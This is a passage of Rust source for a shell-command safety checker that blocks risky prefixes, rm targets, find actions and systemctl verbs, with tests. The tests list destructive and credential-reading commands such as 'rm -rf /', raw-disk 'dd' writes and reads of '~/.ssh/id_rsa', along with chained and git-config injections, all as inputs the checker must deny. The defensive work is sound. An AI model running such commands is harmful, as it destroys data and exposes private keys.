        if v == "-u" || v == "--unset" {
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny("env option requires value".into()));
            }
            j += 2;
            continue;
        }
        if v.starts_with("--unset=") {
            j += 1;
            continue;
        }
        if v.starts_with("-u") && v.len() > 2 {
            j += 1;
            continue;
        }
        if let Some(split) = get_env_split_string_arg(tokens, j) {
            return split;
        }
        if no_arg.contains(&v.as_str()) {
            j += 1;
            continue;
        }
        if v.starts_with('-') && v != "--" {
            return PrefixOutcome::Stop(Decision::Deny("Blocked unknown env option".into()));
        }
        if v == "--" {
            return PrefixOutcome::Continue(j + 1);
        }
        break;
    }
    PrefixOutcome::Continue(j)
}

fn parse_timeout(tokens: &[Token], i: usize) -> PrefixOutcome {
    let no_arg = [
        "--preserve-status",
        "--foreground",
        "-v",
        "--verbose",
        "--help",
        "--version",
    ];
    let mut j = i + 1;
    while j < tokens.len() {
        let v = &tokens[j].value;
        if v == "-s" || v == "--signal" || v == "-k" || v == "--kill-after" {
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny("timeout option requires value".into()));
            }
            j += 2;
            continue;
        }
        if v.starts_with("--signal=") || v.starts_with("--kill-after=") {
            j += 1;
            continue;
        }
        if (v.starts_with("-s") || v.starts_with("-k")) && v.len() > 2 {
            j += 1;
            continue;
        }
        if no_arg.contains(&v.as_str()) {
            j += 1;
            continue;
        }
        if v == "--" {
            j += 1;
            break;
        }
        if v.starts_with('-') {
            return PrefixOutcome::Stop(Decision::Deny("Blocked unknown timeout option".into()));
        }
        break;
    }
    if j >= tokens.len() {
        return PrefixOutcome::Stop(Decision::Deny("timeout missing duration".into()));
    }
    j += 1; // skip duration
    if j >= tokens.len() {
        return PrefixOutcome::Stop(Decision::Deny("timeout missing command".into()));
    }
    PrefixOutcome::Continue(j)
}

fn parse_stdbuf(tokens: &[Token], i: usize) -> PrefixOutcome {
    let mut j = i + 1;
    while j < tokens.len() {
        let v = &tokens[j].value;
        if v == "-i"
            || v == "-o"
            || v == "-e"
            || v == "--input"
            || v == "--output"
            || v == "--error"
        {
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny("stdbuf option requires value".into()));
            }
            j += 2;
            continue;
        }
        if v.starts_with("--input=") || v.starts_with("--output=") || v.starts_with("--error=") {
            j += 1;
            continue;
        }
        if (v.starts_with("-i") || v.starts_with("-o") || v.starts_with("-e")) && v.len() > 2 {
            j += 1;
            continue;
        }
        if ["--help", "--version"].contains(&v.as_str()) {
            j += 1;
            continue;
        }
        if v.starts_with('-') && v != "--" {
            return PrefixOutcome::Stop(Decision::Deny("Blocked unknown stdbuf option".into()));
        }
        if v == "--" {
            return PrefixOutcome::Continue(j + 1);
        }
        break;
    }
    PrefixOutcome::Continue(j)
}

fn parse_sudo_doas(tokens: &[Token], i: usize, kind: &str) -> PrefixOutcome {
    // Options that take a value.  -e/--edit are *not* listed here: sudo -e is
    // equivalent to sudoedit and must be rejected outright.
    let value_short: &[char] = &['u', 'g', 'p', 'r', 't', 'h', 'C', 'R', 'U', 'D', 'c', 'T'];
    let value_long: &[&str] = &[
        "user",
        "group",
        "prompt",
        "role",
        "type",
        "close-from",
        "other-user",
        "chdir",
        "chroot",
        "timeout",
        "askpass",
        "host",
        "group-plugin",
        "user-plugin",
    ];
    let mut j = i + 1;
    while j < tokens.len() {
        let v = &tokens[j].value;
        if v == "--" {
            return PrefixOutcome::Continue(j + 1);
        }
        // -h alone is --help, but -h <host> is --host and takes a value.
        if v == "-h" && j + 1 == tokens.len() {
            return PrefixOutcome::Stop(Decision::Allow);
        }
        // -e and --edit let the caller edit arbitrary files as another user.
        if v == "-e" || v == "--edit" || v.starts_with("--edit=") {
            return PrefixOutcome::Stop(Decision::Deny(format!(
                "{} -e/--edit is not allowed",
                kind
            )));
        }
        if v.starts_with("--") {
            let eq = v.find('=').unwrap_or(v.len());
            let name = &v[2..eq];
            if value_long.contains(&name) && eq == v.len() {
                if j + 1 >= tokens.len() {
                    return PrefixOutcome::Stop(Decision::Deny(format!(
                        "{} option requires value",
                        kind
                    )));
                }
                j += 2;
            } else {
                j += 1;
            }
            continue;
        }
        if v.starts_with('-') && v.len() > 1 {
            let rest = &v[1..];
            let rest_len = rest.chars().count();
            let mut value_in_next = false;
            for (k, ch) in rest.chars().enumerate() {
                if value_short.contains(&ch) {
                    if k == rest_len - 1 {
                        value_in_next = true;
                    }
                    break;
                }
            }
            if value_in_next {
                if j + 1 >= tokens.len() {
                    return PrefixOutcome::Stop(Decision::Deny(format!(
                        "{} option requires value",
                        kind
                    )));
                }
                j += 2;
            } else {
                j += 1;
            }
            continue;
        }
        break;
    }
    if j >= tokens.len() {
        let help_version = ["--help", "-h", "--version", "-V"];
        if tokens.len() == i + 2 && help_version.contains(&tokens[i + 1].value.as_str()) {
            return PrefixOutcome::Stop(Decision::Allow);
        }
        return PrefixOutcome::Stop(Decision::Deny(format!(
            "{} requires an explicit command",
            kind
        )));
    }
    PrefixOutcome::Continue(j)
}

fn parse_interpreter(tokens: &[Token], i: usize, flag: &str) -> PrefixOutcome {
    let mut j = i + 1;
    while j < tokens.len() {
        let v = &tokens[j].value;
        if v == flag {
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny(
                    "Interpreter missing command string".into(),
                ));
            }
            let cmd = &tokens[j + 1];
            if cmd.quoted.is_some() || j + 2 >= tokens.len() {
                return PrefixOutcome::Stop(evaluate(&cmd.value));
            }
            return PrefixOutcome::Stop(evaluate_tokens(tokens, j + 1));
        }
        if v == "--" {
            return PrefixOutcome::Stop(Decision::Deny(
                "Blocked interpreter without -c command string".into(),
            ));
        }
        if v.starts_with('-') && v.len() > 1 {
            j += 1;
            continue;
        }
        break;
    }
    PrefixOutcome::Stop(Decision::Deny(
        "Blocked interpreter without -c command string".into(),
    ))
}

fn first_command_token(tokens: &[Token], start: usize) -> Option<(usize, String)> {
    for (k, token) in tokens.iter().enumerate().skip(start) {
        let v = &token.value;
        if v.starts_with('/') && v.len() > 1 {
            continue;
        }
        let base = get_base_name(v);
        if base.is_empty() {
            continue;
        }
        return Some((k, base));
    }
    None
}

fn parse_cmd(tokens: &[Token], i: usize) -> PrefixOutcome {
    let mut j = i + 1;
    while j < tokens.len() {
        let v = &tokens[j].value;
        let vlower = v.to_lowercase();
        if vlower == "/c" || vlower == "/k" {
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny("cmd missing command string".into()));
            }
            // cmd /c treats the rest of the line as one command string. Re-tokenize
            // the tail so that a single quoted argument such as "call foo.bat" or
            // "powershell -Command ..." is broken into words and checked for Windows
            // launchers, script extensions, and interpreters.
            let tail = tokens[j + 1..]
                .iter()
                .map(|t| t.value.as_str())
                .collect::<Vec<_>>()
                .join(" ");
            let inner = match tokenize(&tail) {
                Ok(t) => t,
                Err(e) => return PrefixOutcome::Stop(Decision::Deny(e)),
            };
            let first = first_command_token(&inner, 0);
            if let Some((_, ref base)) = first
                && WINDOWS_CMD_LAUNCHERS.contains(&base.as_str())
            {
                return PrefixOutcome::Stop(Decision::Deny(format!(
                    "Blocked unanalyzable command: {}",
                    base
                )));
            }
            return PrefixOutcome::Stop(evaluate_tokens(
                &inner,
                first.map(|(idx, _)| idx).unwrap_or(inner.len()),
            ));
        }
        if v.starts_with('/') && v.len() > 1 {
            j += 1;
            continue;
        }
        break;
    }
    PrefixOutcome::Stop(Decision::Deny(
        "Blocked cmd without /c or /k command string".into(),
    ))
}

fn parse_wsl(tokens: &[Token], i: usize) -> PrefixOutcome {
    let value_opts = ["-d", "-u", "--distribution", "--user", "--shell", "--cd"];
    let mut j = i + 1;
    while j < tokens.len() {
        let v = &tokens[j].value;
        if v == "--" {
            if j + 2 == tokens.len() && tokens[j + 1].quoted.is_some() {
                return PrefixOutcome::Stop(evaluate(&tokens[j + 1].value));
            }
            return PrefixOutcome::Continue(j + 1);
        }
        if v == "-e" || v == "--exec" {
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny(
                    "wsl -e/--exec requires command".into(),
                ));
            }
            if j + 2 == tokens.len() && tokens[j + 1].quoted.is_some() {
                return PrefixOutcome::Stop(evaluate(&tokens[j + 1].value));
            }
            return PrefixOutcome::Stop(evaluate_tokens(tokens, j + 1));
        }
        if value_opts.contains(&v.as_str()) {
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny("wsl option requires value".into()));
            }
            j += 2;
            continue;
        }
        if v.starts_with("--") && v.contains('=') {
            j += 1;
            continue;
        }
        if v.starts_with('-') && v.len() > 1 {
            j += 1;
            continue;
        }
        break;
    }
    if j >= tokens.len() {
        return PrefixOutcome::Stop(Decision::Deny("Blocked wsl without command".into()));
    }
    if j + 1 == tokens.len() && tokens[j].quoted.is_some() {
        return PrefixOutcome::Stop(evaluate(&tokens[j].value));
    }
    PrefixOutcome::Stop(evaluate_tokens(tokens, j))
}

fn parse_busybox(tokens: &[Token], i: usize) -> PrefixOutcome {
    let mut j = i + 1;
    while j < tokens.len() && tokens[j].value.starts_with('-') {
        j += 1;
    }
    if j >= tokens.len() {
        return PrefixOutcome::Stop(Decision::Deny("Busybox applet not specified".into()));
    }
    PrefixOutcome::Stop(evaluate_tokens(tokens, j))
}

fn parse_xargs(tokens: &[Token], i: usize) -> PrefixOutcome {
    let value_opts = [
        "-L",
        "-P",
        "-n",
        "-s",
        "-E",
        "-a",
        "-d",
        "--arg-file",
        "--delimiter",
        "--max-args",
        "--max-chars",
        "--max-lines",
        "--max-procs",
    ];
    let no_arg = [
        "-0",
        "--null",
        "-p",
        "--interactive",
        "-r",
        "--no-run-if-empty",
        "-t",
        "--verbose",
        "-x",
        "--exit",
        "--help",
        "--version",
        "-S",
        "--show-limits",
        "-e",
        "--eof",
    ];
    let mut j = i + 1;
    let mut saw_replace = false;
    while j < tokens.len() {
        let v = &tokens[j].value;
        if v == "--" {
            j += 1;
            continue;
        }
        if v == "-I" || v == "-i" || v == "--replace" {
            saw_replace = true;
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny(
                    "xargs replacement option requires value".into(),
                ));
            }
            if has_bare_tilde(&tokens[j + 1]) {
                return PrefixOutcome::Stop(Decision::Deny(
                    "Blocked tilde expansion in xargs option value".into(),
                ));
            }
            j += 2;
            continue;
        }
        if let Some(rest) = v.strip_prefix("--replace=") {
            saw_replace = true;
            if rest.contains('~') {
                return PrefixOutcome::Stop(Decision::Deny(
                    "Blocked tilde expansion in xargs option value".into(),
                ));
            }
            j += 1;
            continue;
        }
        if (v.starts_with("-I") || v.starts_with("-i")) && v.len() > 2 {
            saw_replace = true;
            j += 1;
            continue;
        }
        if v == "-e"
            || v == "--eof"
            || (v.starts_with("-e") && v.len() > 2)
            || v.starts_with("--eof=")
        {
            j += 1;
            continue;
        }
        if no_arg.contains(&v.as_str()) {
            j += 1;
            continue;
        }
        if value_opts.contains(&v.as_str()) {
            if j + 1 >= tokens.len() {
                return PrefixOutcome::Stop(Decision::Deny("xargs option requires value".into()));
            }
            if has_bare_tilde(&tokens[j + 1]) {
                return PrefixOutcome::Stop(Decision::Deny(
                    "Blocked tilde expansion in xargs option value".into(),
                ));
            }
            j += 2;
            continue;
        }
        if v.starts_with("--") && v.contains('=') {
            let eq = v.find('=').unwrap();
            let val = &v[eq + 1..];
            if val.contains('~') {
                return PrefixOutcome::Stop(Decision::Deny(
                    "Blocked tilde expansion in xargs option value".into(),
                ));
            }
            j += 1;
            continue;
        }
        if v.starts_with('-') && v.len() > 1 {
            return PrefixOutcome::Stop(Decision::Deny("Blocked unknown xargs option".into()));
        }
        break;
    }
    if saw_replace {
        return PrefixOutcome::Stop(Decision::Deny(
            "Blocked xargs argument replacement (-I/-i/--replace); cannot verify substituted arguments".into(),
        ));
    }
    if j >= tokens.len() {
        return PrefixOutcome::Stop(Decision::Allow);
    }
    let cmd_base = get_base_name(&tokens[j].value);
    if DANGEROUS_COMMANDS.contains(&cmd_base.as_str())
        || UNANALYZABLE_COMMANDS.contains(&cmd_base.as_str())
    {
        return PrefixOutcome::Stop(Decision::Deny(format!(
            "Blocked xargs with dangerous/unanalyzable command: {}",
            cmd_base
        )));
    }
    if cmd_base != "echo" {
        return PrefixOutcome::Stop(Decision::Deny(format!(
            "Blocked xargs with unanalyzed command: {}",
            cmd_base
        )));
    }
    PrefixOutcome::Stop(evaluate_tokens(tokens, j))
}

fn check_rm(tokens: &[Token], rm_index: usize) -> Decision {
    let argv: Vec<&str> = tokens.iter().map(|t| t.value.as_str()).collect();
    let mut recursive = false;
    let mut force = false;
    let mut no_preserve_root = false;
    let mut saw_double_dash = false;
    for arg in argv.iter().skip(rm_index + 1).copied() {
        if !saw_double_dash && arg == "--" {
            saw_double_dash = true;
            continue;
        }
        if !saw_double_dash && arg.starts_with('-') {
            if let Some(name) = arg.strip_prefix("--") {
                if ["recursive", "r", "remove", "R"].contains(&name) {
                    recursive = true;
                }
                if ["force", "f"].contains(&name) {
                    force = true;
                }
                if name == "no-preserve-root" {
                    no_preserve_root = true;
                }
                if name == "preserve-root" {
                    no_preserve_root = false;
                }
            } else {
                for ch in arg[1..].chars() {
                    if ch == 'r' || ch == 'R' {
                        recursive = true;
                    }
                    if ch == 'f' {
                        force = true;
                    }
                }
            }
            continue;
        }
        if recursive && (force || no_preserve_root) && is_dangerous_rm_target(arg) {
            return Decision::Deny("Blocked rm -rf on a dangerous target".into());
        }
    }
    Decision::Allow
}

fn check_find(tokens: &[Token], i: usize) -> Decision {
    let dangerous = ["-exec", "-execdir", "-ok", "-okdir", "-delete"];
    for t in &tokens[i..] {
        if dangerous.contains(&t.value.as_str()) {
            return Decision::Deny("Blocked dangerous find action".into());
        }
    }
    Decision::Allow
}

const DANGEROUS_SYSTEMCTL_VERBS: &[&str] = &[
    "poweroff",
    "reboot",
    "halt",
    "shutdown",
    "kexec",
    "suspend",
    "hibernate",
    "hybrid-sleep",
    "suspend-then-hibernate",
    "emergency",
    "rescue",
];

fn check_systemctl(tokens: &[Token], i: usize) -> Decision {
    let value_long: &[&str] = &[
        "host",
        "machine",
        "property",
        "type",
        "lines",
        "output",
        "prefix",
        "state",
        "root",
        "image",
        "image-policy",
        "drop-in",
        "name",
        "uid",
        "gid",
        "setenv",
    ];
    let value_short: &[char] = &['H', 'M', 'p', 't', 'n', 'o', 'P', 'E'];
    let mut j = i + 1;
    while j < tokens.len() {
        let v = &tokens[j].value;
        if v == "--" {
            j += 1;
            continue;
        }
        if let Some(rest) = v.strip_prefix("--") {
            if let Some(eq) = rest.find('=') {
                let name = &rest[..eq];
                if value_long.contains(&name) {
                    j += 1;
                    continue;
                }
            } else if value_long.contains(&rest) {
                if j + 1 >= tokens.len() {
                    return Decision::Deny("systemctl option requires value".into());
                }
                j += 2;
                continue;
            }
            // Unknown or no-argument long option.
            j += 1;
            continue;
        } else if v.starts_with('-') && v.len() > 1 {
            let bytes = v.as_bytes();
            let mut k = 1;
            let mut consumed = false;
            while k < bytes.len() {
                let ch = bytes[k] as char;
                if value_short.contains(&ch) {
                    if k == bytes.len() - 1 {
                        if j + 1 >= tokens.len() {
                            return Decision::Deny("systemctl option requires value".into());
                        }
                        j += 2;
                    } else {
                        j += 1;
                    }
                    consumed = true;
                    break;
                }
                k += 1;
            }
            if consumed {
                continue;
            }
            j += 1;
            continue;
        }
        if DANGEROUS_SYSTEMCTL_VERBS.contains(&v.as_str()) {
            return Decision::Deny(format!("Blocked systemctl {v}"));
        }
        // First non-option token is not a destructive verb; allow unit names.
        break;
    }
    Decision::Allow
}

fn is_dangerous_rm_target(arg: &str) -> bool {
    let mut target = arg.to_string();
    if target.split(['/', '\\']).any(|seg| seg == "..") {
        return true;
    }
    if target.starts_with(".*") {
        return true;
    }

    let home = std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .unwrap_or_default();

    if target == "~" || target == "~/" || target.starts_with("~/") || target.starts_with("~\\") {
        target = format!("{}{}", home, &target[1..]);
    } else if target.starts_with('~') {
        return true;
    }

    if !home.is_empty() {
        target = target.replace("$HOME", &home);
    }
    if target.contains('$') {
        return true;
    }

    let normalized = normalize_target(&target);
    if normalized.is_empty() || normalized == "." {
        return true;
    }
    let sep = std::path::MAIN_SEPARATOR;
    if normalized == sep.to_string() || normalized == "/" || normalized == "\\" {
        return true;
    }
    if normalized.len() == 3
        && normalized.as_bytes()[0].is_ascii_alphabetic()
        && normalized.as_bytes()[1] == b':'
        && (normalized.as_bytes()[2] == b'\\' || normalized.as_bytes()[2] == b'/')
    {
        return true;
    }

    if !home.is_empty() {
        let home_norm = normalize_target(&home);
        if normalized
            .trim_end_matches(['/', '\\'])
            .eq_ignore_ascii_case(home_norm.trim_end_matches(['/', '\\']))
        {
            return true;
        }
    }

    if cfg!(windows)
        && let Ok(system_root) = std::env::var("SystemRoot").or_else(|_| std::env::var("windir"))
    {
        let sys = system_root.to_lowercase();
        let sys_with_sep = if sys.ends_with('\\') {
            sys.clone()
        } else {
            format!("{}\\", sys)
        };
        let norm_lower = normalized.to_lowercase();
        if norm_lower == sys || norm_lower.starts_with(&sys_with_sep) {
            return true;
        }
    }

    if !target.contains('*') && is_absolute_target(&normalized) {
        let segs: Vec<&str> = normalized
            .split(['/', '\\'])
            .filter(|s| !s.is_empty())
            .collect();
        if segs.len() <= 2 {
            return true;
        }
    }

    if normalized.split(['/', '\\']).any(|s| s == "..") {
        return true;
    }

    if is_broad_glob_target(&target, &home) {
        return true;
    }

    false
}

fn is_absolute_target(s: &str) -> bool {
    if cfg!(windows) {
        if s.starts_with('\\') || s.starts_with('/') {
            return true;
        }
        s.len() >= 3
            && s.as_bytes()[0].is_ascii_alphabetic()
            && s.as_bytes()[1] == b':'
            && (s.as_bytes()[2] == b'\\' || s.as_bytes()[2] == b'/')
    } else {
        s.starts_with('/')
    }
}

/// Returns true when `target` is a shell glob that can match many files in a
/// sensitive directory, or a dotfile glob whose pattern can match `..'.
fn is_broad_glob_target(target: &str, home: &str) -> bool {
    let Some(first_wild) = target.find(['*', '?', '[']) else {
        return false;
    };
    let dir_end = target[..=first_wild].rfind(['/', '\\']);
    let (dir, base) = match dir_end {
        Some(end) => (&target[..=end], &target[end + 1..]),
        None => ("", target),
    };

    // Dotfile globs whose pattern (after the leading dot) begins with a wildcard
    // can match `.', `..', or a broad set of dotfiles and climb to a parent
    // directory. Treat them as dangerous regardless of which directory they are in.
    if let Some(rest) = base.strip_prefix('.')
        && (rest.starts_with('*') || rest.starts_with('?') || rest.starts_with('['))
    {
        return true;
    }

    let norm_dir = normalize_target(dir);
    let is_root = norm_dir == "/"
        || norm_dir == "\\"
        || (norm_dir.len() == 3
            && norm_dir.as_bytes()[0].is_ascii_alphabetic()
            && norm_dir.as_bytes()[1] == b':'
            && (norm_dir.as_bytes()[2] == b'\\' || norm_dir.as_bytes()[2] == b'/'));

    let clean_dir = norm_dir.trim_end_matches(['/', '\\']);
    let in_cwd = clean_dir.is_empty() || clean_dir == ".";
    let in_home = !home.is_empty()
        && clean_dir.to_lowercase()
            == normalize_target(home)
                .trim_end_matches(['/', '\\'])
                .to_lowercase();

    if (in_cwd || in_home || is_root)
        && (base.starts_with('*') || base.starts_with('?') || base.starts_with('['))
    {
        return true;
    }

    false
}

fn normalize_target(s: &str) -> String {
    let sep = std::path::MAIN_SEPARATOR;
    let mut rest = s;
    let mut drive = None::<&str>;
    let mut root = false;

    if cfg!(windows) && rest.len() >= 2 {
        let bytes = rest.as_bytes();
        if bytes[0].is_ascii_alphabetic() && bytes[1] == b':' {
            drive = Some(&rest[..2]);
            rest = &rest[2..];
            if rest.starts_with('/') || rest.starts_with('\\') {
                root = true;
                rest = &rest[1..];
            }
        }
    }

    if !rest.is_empty() && (rest.starts_with('/') || rest.starts_with('\\')) {
        root = true;
        rest = &rest[1..];
    }

    let trailing_sep = !rest.is_empty() && (rest.ends_with('/') || rest.ends_with('\\'));
    let parts: Vec<&str> = rest.split(['/', '\\']).collect();
    let mut stack = Vec::new();
    for part in parts {
        if part.is_empty() || part == "." {
            continue;
        }
        if part == ".." {
            if let Some(last) = stack.last()
                && last != ".."
            {
                stack.pop();
                continue;
            }
            if !root && drive.is_none() {
                stack.push("..".to_string());
            }
            continue;
        }
        stack.push(part.to_string());
    }

    let mut out = String::new();
    if let Some(d) = drive {
        out.push_str(d);
    }
    if root {
        out.push(sep);
    }
    if !stack.is_empty() {
        out.push_str(&stack.join(&sep.to_string()));
    }
    if out.is_empty() || (drive.is_some() && !root && stack.is_empty()) {
        out.push('.');
    }
    if trailing_sep && !out.ends_with(sep) {
        out.push(sep);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dec(cmd: &str) -> Decision {
        evaluate(cmd)
    }

    fn allow(cmd: &str) {
        assert_eq!(dec(cmd), Decision::Allow, "expected allow for {}", cmd);
    }

    fn deny(cmd: &str, reason: &str) {
        match dec(cmd) {
            Decision::Allow => panic!("expected deny for {}", cmd),
            Decision::Deny(r) => assert!(
                r.contains(reason),
                "expected reason containing '{}' for {}, got '{}'",
                reason,
                cmd,
                r
            ),
        }
    }

    #[test]
    fn safe_commands() {
        for cmd in &[
            "git status --short",
            "cat README.md",
            "grep -r foo src",
            "npm run build",
            "echo \"hello world\"",
            "bash -c 'git status'",
            "bash -c 'echo hello'",
            "rm -rf node_modules/.cache",
            "rm -rf /home/user/docs/project",
            "rm -rf /tmp/*.log",
            "rm -rf ~/docs/project",
            "rm -rf foo*",
            "rm -rf .cache*",
            "xargs echo",
            "env -S 'echo hello'",
            "env VAR=1 echo hello",
            "xargs echo \"hello world\"",
            "cmd /c \"\" echo hello",
        ] {
            allow(cmd);
        }
    }

    #[test]
    fn dangerous_commands() {
        for (cmd, reason) in &[
            ("rm -rf /", "Blocked rm -rf on a dangerous target"),
            ("rm -rf ~", "Blocked rm -rf on a dangerous target"),
            ("rm -rf ~/*", "Blocked rm -rf on a dangerous target"),
            ("rm -rf /.*", "Blocked rm -rf on a dangerous target"),
            ("rm -rf .*", "Blocked rm -rf on a dangerous target"),
            ("rm -rf .?*", "Blocked rm -rf on a dangerous target"),
            ("rm -rf .??*", "Blocked rm -rf on a dangerous target"),
            ("rm -rf /tmp/.??*", "Blocked rm -rf on a dangerous target"),
            ("rm -rf ~/.??*", "Blocked rm -rf on a dangerous target"),
            ("rm -rf *", "Blocked rm -rf on a dangerous target"),
            ("rm -rf *.log", "Blocked rm -rf on a dangerous target"),
            ("rm -rf *foo", "Blocked rm -rf on a dangerous target"),
            ("bash -c 'rm -rf *'", "Blocked rm -rf on a dangerous target"),
            (
                "sh -c \"rm -rf .??*\"",
                "Blocked rm -rf on a dangerous target",
            ),
            ("rm -rf .", "Blocked rm -rf on a dangerous target"),
            ("rm -rf ..", "Blocked rm -rf on a dangerous target"),
            ("rm -rf ../../", "Blocked rm -rf on a dangerous target"),
            ("sudo mkfs", "Blocked potentially destructive command: mkfs"),
            (
                "sudo -u root rm -rf /",
                "Blocked rm -rf on a dangerous target",
            ),
            (
                "nice -n 10 rm -rf /",
                "Blocked rm -rf on a dangerous target",
            ),
            (
                "bash -c \"rm -rf /\"",
                "Blocked rm -rf on a dangerous target",
            ),
            ("bash -c 'rm -rf /'", "Blocked rm -rf on a dangerous target"),
            (
                "cmd /c \"del /f C:\\\\temp\"",
                "Blocked destructive Windows delete",
            ),
            (
                "cat \"$HOME/.ssh/id_rsa\"",
                "Blocked variable expansion inside double quotes",
            ),
            (
                "cat ~/.ssh/id_rsa",
                "Blocked tilde expansion outside quotes",
            ),
            (
                "xargs -0 rm -rf",
                "Blocked xargs with unanalyzed command: rm",
            ),
            (
                "xargs -a ~/.ssh/id_rsa echo",
                "Blocked tilde expansion in xargs option value",
            ),
            (
                "xargs -I PLACEHOLDER rm -rf PLACEHOLDER",
                "Blocked xargs argument replacement",
            ),
            (
                "xargs --verbose rm",
                "Blocked xargs with unanalyzed command: rm",
            ),
            ("xargs -S rm", "Blocked xargs with unanalyzed command: rm"),
            (
                "xargs --show-limits rm",
                "Blocked xargs with unanalyzed command: rm",
            ),
            ("xargs -e rm", "Blocked xargs with unanalyzed command: rm"),
            ("xargs -- rm", "Blocked xargs with unanalyzed command: rm"),
            (
                "xargs -a /etc/passwd -- rm",
                "Blocked xargs with unanalyzed command: rm",
            ),
            (
                "cmd /c del /f C:\\\\temp",
                "Blocked destructive Windows delete",
            ),
            (
                "wsl -e node script.js",
                "Blocked unanalyzable command: node",
            ),
            (
                "wsl -e bash -c 'rm -rf /'",
                "Blocked rm -rf on a dangerous target",
            ),
            ("echo $(whoami)", "Blocked command substitution"),
            ("echo `whoami`", "Blocked command substitution (backtick)"),
            (
                "dd if=/dev/zero of=/dev/sda",
                "Blocked dd writing to a raw device",
            ),
            (
                "format C:",
                "Blocked potentially destructive command: format",
            ),
            (
                "shutdown now",
                "Blocked potentially destructive command: shutdown",
            ),
            ("env -S 'rm -rf /'", "Blocked rm -rf on a dangerous target"),
            (
                "env --split-string='rm -rf /'",
                "Blocked rm -rf on a dangerous target",
            ),
            (
                "env -S bash -c 'rm -rf /'",
                "Blocked rm -rf on a dangerous target",
            ),
            (
                "env -S 'bash -c \"rm -rf /\"'",
                "Blocked rm -rf on a dangerous target",
            ),
            (
                "python3.11 -c 'import os; os.system(\"rm -rf /\")'",
                "Blocked unanalyzable command: python",
            ),
            (
                "ksh93 -c 'rm -rf /'",
                "Blocked rm -rf on a dangerous target",
            ),
            (
                "mawk 'BEGIN{system(\"rm -rf /\")}'",
                "Blocked unanalyzable command: mawk",
            ),
            (
                "busybox sh -c 'rm -rf /'",
                "Blocked rm -rf on a dangerous target",
            ),
            (
                "docker run --rm -v /:/host alpine rm -rf /host",
                "Blocked unanalyzable command: docker",
            ),
            (
                "xargs printf '%n'",
                "Blocked xargs with unanalyzed command: printf",
            ),
            (
                "unshare -r /bin/sh",
                "Blocked unanalyzable command: unshare",
            ),
            ("pkexec rm -rf /", "Blocked unanalyzable command: pkexec"),
            (
                "format.com C:",
                "Blocked potentially destructive command: format",
            ),
            (
                "format.bat /y",
                "Blocked potentially destructive command: format",
            ),
            (
                "diskpart.bat /s script.txt",
                "Blocked potentially destructive command: diskpart",
            ),
            (
                "shutdown.bat /s /t 0",
                "Blocked potentially destructive command: shutdown",
            ),
            (
                "cmd /c format.com C:",
                "Blocked potentially destructive command: format",
            ),
            (
                "python3.11.bat -c 'import os; os.system(\"rm -rf /\")'",
                "Blocked unanalyzable command: python",
            ),
            ("node.js script.js", "Blocked unanalyzable command: node"),
            (
                "cmd /c start powershell",
                "Blocked unanalyzable command: start",
            ),
            (
                "cmd /c start /b powershell -Command \"rm -rf /\"",
                "Blocked unanalyzable command: start",
            ),
            (
                "cmd /c call powershell",
                "Blocked unanalyzable command: call",
            ),
            (
                "cmd /c runas /user:admin powershell",
                "Blocked unanalyzable command: runas",
            ),
            (
                "cmd /c \"\" start powershell",
                "Blocked unanalyzable command: start",
            ),
            (
                "cmd /c \"\" start /b powershell -Command \"rm -rf /\"",
                "Blocked unanalyzable command: start",
            ),
            (
                "cmd /c \"\" format C:",
                "Blocked potentially destructive command: format",
            ),
            (
                "cmd /c \"\" powershell -Command \"rm -rf /\"",
                "Blocked unanalyzable command: powershell",
            ),
            (
                "cmd /c \"\" call foo.bat",
                "Blocked unanalyzable command: call",
            ),
            (
                "cmd /c \"\" runas /user:admin powershell",
                "Blocked unanalyzable command: runas",
            ),
            (
                "runas /user:admin powershell",
                "Blocked unanalyzable command: runas",
            ),
            ("py -c \"print(1)\"", "Blocked unanalyzable command: py"),
            ("py3 -c \"print(1)\"", "Blocked unanalyzable command: py"),
            ("py3.11 -c \"print(1)\"", "Blocked unanalyzable command: py"),
            ("pythonw script.py", "Blocked unanalyzable command: pythonw"),
            (
                "pythonw3.11 -c \"print(1)\"",
                "Blocked unanalyzable command: pythonw",
            ),
            ("pyw3 -c \"print(1)\"", "Blocked unanalyzable command: pyw"),
            ("rm -rf ~/", "Blocked rm -rf on a dangerous target"),
            (
                "dd if=/dev/zero of=\\\\.\\PhysicalDrive0",
                "Blocked dd writing to a raw device",
            ),
            (
                "git config core.pager \"bash -c 'rm -rf /'\"",
                "git config key can run arbitrary commands",
            ),
            (
                "git config --global alias.x rm",
                "git config key can run arbitrary commands",
            ),
            (
                "git config core.sshCommand \"bash -c 'rm -rf /'\"",
                "git config key can run arbitrary commands",
            ),
            (
                "git config gpg.program rm",
                "git config key can run arbitrary commands",
            ),
            (
                "git config filter.lfs.clean rm",
                "git config key can run arbitrary commands",
            ),
            (
                "git config include.path /tmp/evil",
                "git config key can run arbitrary commands",
            ),
            (
                "git config includeIf.gitdir:foo.path /tmp/evil",
                "git config key can run arbitrary commands",
            ),
        ] {
            deny(cmd, reason);
        }
    }

    #[test]
    fn shell_metacharacters() {
        for cmd in &[
            "echo a; rm -rf /",
            "echo a && rm -rf /",
            "echo a | cat",
            "echo a > file",
            "echo a\nrm -rf /",
            "bash -c \"git status\nrm -rf /\"",
        ] {
            match dec(cmd) {
                Decision::Allow => panic!("expected deny for {}", cmd),
                Decision::Deny(r) => assert!(
                    r.contains("Blocked shell metacharacter")
                        || r.contains("Blocked command substitution"),
                    "unexpected reason for {}: {}",
                    cmd,
                    r
                ),
            }
        }
    }

    #[test]
    fn systemctl_blocks_destructive_verbs() {
        for (cmd, reason) in &[
            ("systemctl poweroff", "Blocked systemctl poweroff"),
            ("systemctl --no-wall reboot", "Blocked systemctl reboot"),
            ("systemctl halt", "Blocked systemctl halt"),
            ("systemctl kexec", "Blocked systemctl kexec"),
            ("systemctl suspend", "Blocked systemctl suspend"),
            ("systemctl hibernate", "Blocked systemctl hibernate"),
